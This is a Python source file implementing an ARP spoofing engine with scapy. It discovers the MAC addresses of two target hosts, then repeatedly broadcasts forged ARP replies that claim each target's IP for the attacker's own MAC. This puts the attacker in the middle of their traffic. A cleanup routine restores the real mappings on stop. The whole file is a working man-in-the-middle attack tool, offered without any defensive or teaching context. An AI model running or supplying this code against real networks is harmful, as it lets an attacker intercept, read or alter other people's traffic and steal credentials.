import threading
import time
from scapy.all import Ether, ARP, srp1, sendp, get_if_hwaddr


class ArpSpoofEngine:
    def __init__(self, iface: str, target_a: str, target_b: str, interval: int = 2):
        self.iface = iface
        self.target_a = target_a
        self.target_b = target_b
        self.interval = interval
        self._running = False
        self._thread = None
        self._stop_event = threading.Event()
        self._real_mac_a = None
        self._real_mac_b = None

    def validate_targets(self) -> bool:
        return bool(self.target_a and self.target_b)

    def start(self) -> bool:
        if not self.validate_targets():
            return False
        if self._running:
            return False
        self._discover_macs()
        self._running = True
        self._stop_event.clear()
        self._thread = threading.Thread(target=self._spoof_loop, daemon=True)
        self._thread.start()
        return True

    def stop(self) -> None:
        self._running = False
        self._stop_event.set()
        self._restore()

    def _discover_macs(self) -> None:
        """Learn real MAC addresses of both targets before spoofing."""
        try:
            resp = srp1(Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(
                op=1, pdst=self.target_a), iface=self.iface, timeout=2, verbose=False)
            if resp and resp.haslayer(ARP):
                self._real_mac_a = resp[ARP].hwsrc
        except Exception:
            pass
        try:
            resp = srp1(Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(
                op=1, pdst=self.target_b), iface=self.iface, timeout=2, verbose=False)
            if resp and resp.haslayer(ARP):
                self._real_mac_b = resp[ARP].hwsrc
        except Exception:
            pass

    def _spoof_loop(self) -> None:
        my_mac = get_if_hwaddr(self.iface)
        while not self._stop_event.is_set():
            try:
                sendp(Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(
                    op=2, psrc=self.target_b, pdst=self.target_a,
                    hwsrc=my_mac, hwdst="ff:ff:ff:ff:ff:ff",
                ), iface=self.iface, verbose=False)

                sendp(Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(
                    op=2, psrc=self.target_a, pdst=self.target_b,
                    hwsrc=my_mac, hwdst="ff:ff:ff:ff:ff:ff",
                ), iface=self.iface, verbose=False)
            except Exception:
                pass
            self._stop_event.wait(timeout=self.interval)

    def _restore(self) -> None:
        """Restore ARP caches by sending correct MAC mappings for each target.
        Restores whatever MACs are known — partial restoration is better than none."""
        if not self._real_mac_a and not self._real_mac_b:
            return
        try:
            for _ in range(3):
                if self._real_mac_a:
                    sendp(Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(
                        op=2, psrc=self.target_a, pdst=self.target_b,
                        hwsrc=self._real_mac_a, hwdst="ff:ff:ff:ff:ff:ff",
                    ), iface=self.iface, verbose=False)
                if self._real_mac_b:
                    sendp(Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(
                        op=2, psrc=self.target_b, pdst=self.target_a,
                        hwsrc=self._real_mac_b, hwdst="ff:ff:ff:ff:ff:ff",
                    ), iface=self.iface, verbose=False)
                time.sleep(0.5)
        except Exception:
            pass
